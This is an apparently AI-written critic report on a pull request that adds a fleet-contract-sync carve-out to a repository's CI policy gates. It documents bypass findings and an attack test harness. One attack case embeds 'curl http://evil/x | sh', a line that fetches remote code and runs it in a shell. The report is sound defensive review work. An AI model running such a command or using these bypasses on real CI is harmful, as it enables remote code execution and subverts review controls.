@@ -1,0 +1,326 @@
+schema_ref: critic-report.schema.yaml
+kind: CriticReport
+schema_version: "2.0"
+sprint_id: 2026-08-04-issue-244-fleet-contract-carveout
+lane_id: issue-244-fleet-contract-carveout
+pull_request: 245
+worker_agent: claude-fleet-contract-carveout-worker
+worker_session_id: e9b9efbf-ee93-4015-9888-05de67220c6a
+critic_agent: claude-fleet-contract-carveout-critic-r3
+critic_session_id: critic-r3-2026-08-04-e21278452-independent
+implementation_head_sha: "16bd8bf34eb9f084c5db6151c01a264ed6234744"
+evidence_head_sha: "e212784523c47a1e64d2013c45684f55d83d9cee"
+reviewed_head_sha: "e212784523c47a1e64d2013c45684f55d83d9cee"
+closeout_path: .agent-workflow/sprints/2026-08-04-issue-244-fleet-contract-carveout/lanes/closeout/issue-244-fleet-contract-carveout.closeout.yaml
+closeout_sha256: "df9b5e22f6d77908d9f3e38dda62d23010a95a506c117a1fa14bf49c5b636404"
+review_worktree: /Users/jason/repos/verdify-worktrees/2026-08-04-issue-244-critic-r3
+outcome: approve_with_risks
+findings:
+  - id: FIND-001
+    severity: low
+    statement: >-
+      NEW in round 3 (missed by rounds 1 and 2). ManagedContractDiff's
+      outside-span check compares the CONCATENATION of the bytes before the
+      BEGIN sentinel and after the END sentinel, not the (before, after) pair.
+      outside_sentinel_span returns `before + after`, so a head whose split
+      point moved but whose concatenation is byte-identical compares equal.
+      A labelled pull request can therefore RELOCATE the managed sentinel block
+      to a different position in AGENTS.md/CLAUDE.md while the check reports
+      "confined". This is not a path-confinement bypass and it cannot alter the
+      repository's own prose (those bytes are preserved verbatim and in order),
+      but it does contradict the class doc's positional reading of "changed
+      outside its managed sentinel span", and it permits contrived semantic
+      manipulation such as moving the managed block into or out of a fenced
+      code block that was previously entirely outside the span.
+    evidence:
+      - >-
+        Proven by direct execution against lib/verdify/managed_contract_diff.rb
+        at e212784523c47a1e64d2013c45684f55d83d9cee. Synthetic repo, base
+        AGENTS.md = "HEADER-A\n" + BEGIN + "\nMANAGED v1\n" + END + "FOOTER-B\n"
+        (before="HEADER-A\n", after="FOOTER-B\n"); head AGENTS.md =
+        "HEADER-A\nFOOTER-B\n" + BEGIN + "\nEVIL v2 RELOCATED\n" + END
+        (before="HEADER-A\nFOOTER-B\n", after=""). Both concatenations are the
+        identical string "HEADER-A\nFOOTER-B\n".
+        Verdify::ManagedContractDiff.evaluate returned confined?=true with
+        errors=[] -- i.e. the relocated span was ACCEPTED.
+      - >-
+        Contrast control: an equivalent relocation whose concatenation differs
+        by a single newline was correctly REJECTED with
+        "AGENTS.md changed outside its managed sentinel span", confirming the
+        check is doing concatenation equality and nothing positional.
+    requested_action: >-
+      Non-blocking for this merge. Tighten outside_sentinel_span to compare the
+      two segments as a PAIR (e.g. return [before, after] and compare the pair,
+      or additionally assert text.index(SENTINEL_BEGIN) is unchanged between
+      base and head), and add a unit test pinning the relocation case. Until
+      then, correct the class doc so it does not claim positional confinement.
+  - id: FIND-002
+    severity: medium
+    statement: >-
+      The carve-out is NOT functional end-to-end in live CI at this head, as the
+      pull request body itself discloses. The Ruby half requires a current-head
+      APPROVED owner review via owner_approval_errors, but
+      .github/workflows/delivery-gate.yml still gates both the review fetch and
+      the --reviews flag on base_ref == 'main' only, so a dev
+      fleet-contract-sync pull request is always evaluated with reviews = [].
+      The behaviour is fail-CLOSED (the approval is always reported missing, so
+      nothing merges that should not), and it introduces no regression to the
+      existing dev or main routes, but the label cannot actually be used until
+      the remaining workflow patch lands from a workflow-scoped credential.
+    evidence:
+      - >-
+        .github/workflows/delivery-gate.yml at e21278452, "Read review history
+        without review mutation permission" step is still guarded by
+        `if: github.event.pull_request == null || github.event.pull_request.base.ref == 'main'`,
+        and the gate invocation still contains only
+        `if [[ "${BASE_REF}" == "main" ]]; then REVIEWS=(--reviews ...)`.
+        `git diff e123cc81..e21278452 -- .github/workflows/delivery-gate.yml`
+        shows a single hunk, the labeled/unlabeled trigger types from 5f19ba27,
+        and nothing else.
+      - >-
+        scripts/delivery-gate.rb:210-211 -- `reviews = options[:reviews] ?
+        load_json(...) : []` followed by an unconditional owner_approval_errors
+        call for the fleet route, so an unwired workflow yields the error
+        "fleet contract sync requires a current-head APPROVED review by
+        jrvallery or jvallery other than the author".
+    requested_action: >-
+      Land the disclosed delivery-gate.yml review-wiring patch (quoted verbatim
+      in the pull request body) before the verdify:fleet-contract-sync label is
+      applied to any real contract-sync pull request, and re-verify the route
+      end-to-end at that point. Do not treat this lane as delivering a working
+      route until then.
+  - id: FIND-003
+    severity: medium
+    statement: >-
+      The carve-out bounds WHERE a labelled pull request may write, never WHAT
+      it writes there. Content inside the sentinel span of AGENTS.md/CLAUDE.md
+      is entirely unvalidated, and .agent-fleet/ci.yaml is validated only for
+      the presence of the leading "# GENERATED by jvallery/agents" header --
+      the declared `command:` is arbitrary. That file is the build/validate
+      DEFINITION the agent fleet executes for this repository, so an approved
+      contract-sync pull request can change what the fleet runs. This is
+      correctly disclosed in the class doc, the CODEOWNERS comment and the pull
+      request body, and it is not a new capability (the ordinary lane route can
+      change the same file); the delta is that the ceremony guarding it drops
+      from lane-contract-plus-critic to a single owner approval.
+    evidence:
+      - >-
+        Executed attack case "ci.yaml ARBITRARY command, header kept": head
+        .agent-fleet/ci.yaml = "# GENERATED by jvallery/agents\nchecks:\n
+        steps:\n  - command: curl http://evil/x | sh\n".
+        Verdify::ManagedContractDiff.evaluate returned confined?=true,
+        errors=[].
+      - >-
+        lib/verdify/managed_contract_diff.rb generated_header_errors performs
+        only `head_text.match?(GENERATED_FILE_HEADER)`; there is no assertion on
+        any other line of the generated file.
+      - >-
+        Mitigations verified live: GitHub branch protection on dev requires the
+        critic-gate context (probe: `gh api
+        repos/VerdifyConsultancy/verdify-skills/branches/dev/protection` ->
+        required_status_checks.contexts includes "critic-gate"), and
+        .github/CODEOWNERS at this head owns /AGENTS.md, /CLAUDE.md,
+        /.agent-fleet/** and /MANIFEST.sha256 to @jvallery @jrvallery.
+    requested_action: >-
+      Accept as a documented residual for now. Consider a follow-up that binds
+      .agent-fleet/ci.yaml content to the central render (for example a
+      fleet-published digest or signature the gate can compare), so the route
+      does not rely solely on a human reading a generated file.
+  - id: FIND-004
+    severity: low
+    statement: >-
+      manifest_shape_errors constrains MANIFEST.sha256 only to the SHAPE of a
+      manifest (every non-blank line must match a 64-char lowercase hex digest,
+      two spaces, a non-space path). It does not bind the manifest to the tree,
+      so a labelled pull request may replace MANIFEST.sha256 with a
+      well-formed but wholly incorrect manifest and still be reported confined.
+    evidence:
+      - >-
+        Executed attack case "MANIFEST valid-shape but WRONG hashes": head
+        MANIFEST.sha256 = 64 'd' characters + "  totally-unrelated-path".
+        Verdify::ManagedContractDiff.evaluate returned confined?=true,
+        errors=[].
+      - >-
+        Backstop verified: `make manifest-check` in the reviewed worktree
+        reports "MANIFEST.sha256 OK (463 entries verified against the tree)",
+        and the `validate` context that runs it is a required status check on
+        dev per the branch-protection probe above. A tree-inconsistent manifest
+        therefore fails a required check independently of this carve-out.
+    requested_action: >-
+      No change required; the required `validate` check is an adequate
+      independent backstop. Record the dependency so that removing
+      manifest-check from `validate` would need a compensating assertion here.
+  - id: FIND-005
+    severity: note
+    statement: >-
+      The owner-approval requirement added in 5442d76f is enforced in exactly
+      one of the two policy gates. scripts/pr-policy.rb has no review input at
+      all (no --reviews option), so pull-request-policy passes a labelled,
+      confined pull request with zero human reviews; only critic-gate
+      (scripts/delivery-gate.rb) enforces the approval. The route's one-human
+      property is therefore wholly dependent on critic-gate remaining a
+      required status check on dev.
+    evidence:
+      - >-
+        scripts/pr-policy.rb fleet_contract_sync branch (lines 118-132) calls
+        Verdify::ManagedContractDiff.evaluate only; OptionParser in the same
+        file declares no --reviews option.
+      - >-
+        Live confirmation on this pull request: `gh pr checks 245` shows
+        pull-request-policy = pass while critic-gate = fail, with zero APPROVED
+        reviews present (`gh api .../pulls/245/reviews` returns only two
+        COMMENTED reviews).
+    requested_action: >-
+      No code change requested. Note the coupling in the lane record so that any
+      future change to dev's required-contexts list is understood to change this
+      route's human-gate property.
+acceptance_assessment:
+  - criterion_id: LANE-AC-01
+    assessment: satisfied
+    evidence:
+      - >-
+        scripts/pr-policy.rb selects the reduced Outcome+Evidence contract only
+        under `fleet_contract_sync`, which is itself `!release_pr &&
+        !receipt_pr && labels.include?(label)`; the release route is evaluated
+        first and cannot be demoted by any label (lines 95, 113). The
+        confinement proof runs before the body-shape branch (lines 118-132), so
+        the reduced contract is never reached without it.
+      - >-
+        `bash tests/test_pr_policy.sh` at e21278452 -> "PR policy tests passed."
+      - >-
+        Adversarially confirmed: with the label present but an out-of-scope path
+        in the diff, ManagedContractDiff returns
+        "changed paths outside the managed contract: src.rb", which
+        pr-policy.rb concatenates into `errors` and exits non-zero.
+  - criterion_id: LANE-AC-02
+    assessment: satisfied
+    evidence:
+      - >-
+        scripts/delivery-gate.rb lines 193-211: the fleet branch requires an
+        existing base commit, runs ManagedContractDiff, and additionally
+        requires owner_approval_errors to be empty. A labelled pull request that
+        fails either is rejected in place -- control flow never falls through to
+        the lane/contract/critic path in the else branch.
+      - >-
+        `bash tests/test_delivery_gate.sh` at e21278452 -> "Delivery gate tests
+        passed."; the suite includes the confined+reviewed pass plus
+        confined-but-unreviewed, self-approval, non-owner approval and
+        unresolved change-request rejections.
+      - >-
+        Independently executed 30-case attack harness against
+        ManagedContractDiff at this head. All of the following were REJECTED:
+        out-of-scope path; trailing-space, leading-space, tab, newline, quote,
+        and non-ASCII smuggled paths; rename/copy in either direction; delete;
+        chmod to 100755 (both filesystem chmod and index-only update-index);
+        symlink substitution (status T, mode 120000); gitlink substitution
+        (mode 160000); duplicate, missing and inverted sentinels; edit outside
+        the span; missing generated-file header; new file under .agent-fleet/;
+        nested sub/MANIFEST.sha256; garbage, uppercase-hex and binary
+        MANIFEST.sha256; empty diff; and a multi-commit branch whose net diff
+        contains an out-of-scope file. Zero crashes.
+  - criterion_id: LANE-AC-03
+    assessment: satisfied
+    evidence:
+      - >-
+        `ruby tests/test_managed_contract_diff.rb` at e21278452 -> "23 runs, 48
+        assertions, 0 failures, 0 errors, 0 skips".
+      - >-
+        Mutation-tested to prove the suite pins the FIXED behaviour rather than
+        asserting the buggy shape. (1) Restoring the round-1 parser
+        (`line.strip.split("\t")`) -> 1 failure,
+        test_trailing_space_path_is_rejected: "expected the trailing-space path
+        to be rejected, not misread as AGENTS.md". (2) Removing the
+        `mode_errors(path)` call -> 1 failure. (3) Removing the
+        `manifest_shape_errors` call -> 2 failures. The worktree was restored to
+        the committed bytes after each mutation (`git status --porcelain` empty).
+      - >-
+        Round-1 parser fix verified structurally: `git -c core.quotePath=false
+        diff --name-status -z` emits status and path as SEPARATE NUL-terminated
+        tokens (verified by od: "M\0AGENTS.md\0A\0AGENTS.md \0"), so the
+        positional NUL parser in changed_paths is correct, and rename/copy
+        entries are rejected wholesale rather than partially inspected.
+  - criterion_id: LANE-AC-04
+    assessment: satisfied
+    evidence:
+      - >-
+        .github/PULL_REQUEST_TEMPLATE/fleet-contract-sync.md exists at this head
+        (1518 bytes).
+      - >-
+        CONTRIBUTING.md line 16 documents the class, names the label and the
+        mechanical proof, and states the restriction that the carve-out is for
+        refreshes to an already-adopted contract while first-time adoption still
+        uses the full lane contract.
+      - >-
+        `ruby scripts/validate-repo.rb` -> "Verdify repository validation passed
+        (28 skills, 49 schemas)", including the tightened
+        PROTECTED_CODEOWNER_LINES assertion that pins the four new CODEOWNERS
+        entries.
+evidence_assessment:
+  - >-
+    Every claim in the pull request body's Evidence table was re-run
+    independently in a detached worktree at e212784523c47a1e64d2013c45684f55d83d9cee
+    and reproduced: tests/test_pr_policy.sh, tests/test_delivery_gate.sh,
+    tests/test_managed_contract_diff.rb (23 runs / 48 assertions / 0 failures),
+    tests/test_github_delivery_controls.sh, scripts/validate-repo.rb and
+    `make manifest-check` all pass.
+  - >-
+    The body's round-1 and round-2 remediation claims were verified rather than
+    accepted. The NUL parser, the wholesale rename/copy rejection, the blob-mode
+    assertions, the manifest shape assertion and the valid_encoding? guards are
+    all present and all demonstrably load-bearing under mutation.
+  - >-
+    The body's most consequential self-disclosure -- that the delivery-gate.yml
+    review wiring did NOT land and the route therefore fails closed -- is
+    accurate and was confirmed by reading the workflow at this head. The body
+    does not overclaim.
+  - >-
+    Evidence chain integrity confirmed: the closeout's last change is
+    e212784523c47a1e64d2013c45684f55d83d9cee (equal to evidence_head_sha), its
+    SHA256 at that revision is
+    df9b5e22f6d77908d9f3e38dda62d23010a95a506c117a1fa14bf49c5b636404, and its
+    implementation_head_sha, pull_request, worker_agent and worker_session_id
+    match this report.
+integration_risks:
+  - >-
+    The trusted policy engine is checked out from the pull request BASE
+    (.github/workflows/delivery-gate.yml and policy.yml both run
+    trusted-policy/scripts/*.rb from base.sha), so this carve-out has no effect
+    on any pull request until it is merged to dev. The first real exercise of
+    the route will therefore be its first production use; there is no staging
+    rehearsal available inside this repository.
+  - >-
+    Merging with FIND-002 open means dev carries a documented policy route that
+    cannot succeed. A future operator who applies the label without reading the
+    pull request body will see critic-gate fail with an approval error that is
+    accurate in wording but misleading in cause.
+  - >-
+    The label verdify:fleet-contract-sync can be applied by any collaborator
+    with triage rights. Verified live: collaborators are jvallery, jrvallery and
+    evallery (all push+triage+admin). evallery can apply the label but is not in
+    allowed_release_approvers, so a labelled pull request still cannot satisfy
+    the owner-approval requirement -- the label alone confers nothing.
+residual_risks:
+  - >-
+    Span content and .agent-fleet/ci.yaml command content remain unvalidated by
+    the mechanical proof (FIND-003); the human owner approval and CODEOWNERS are
+    the only checks on what the managed surface actually says.
+  - >-
+    The managed sentinel block can be relocated within AGENTS.md/CLAUDE.md while
+    the check reports confined (FIND-001), because outside-span comparison is
+    concatenation equality rather than a positional or pairwise comparison.
+  - >-
+    MANIFEST.sha256 is shape-checked but not tree-bound by this carve-out
+    (FIND-004); correctness depends on `make manifest-check` remaining inside
+    the required `validate` context.
+  - >-
+    The route's one-human property depends entirely on critic-gate remaining a
+    required status check on dev, since pull-request-policy enforces no review
+    requirement (FIND-005).
+  - >-
+    Not verified by this review: the behaviour of the route once the
+    delivery-gate.yml review-wiring patch lands, because that patch is not
+    present at this head and could not be exercised. The Ruby-side approval
+    logic was verified only through its unit tests and by reading
+    owner_approval_errors, not against live GitHub review payloads on the dev
+    route.
+reviewed_at: "2026-08-04T19:53:09Z"
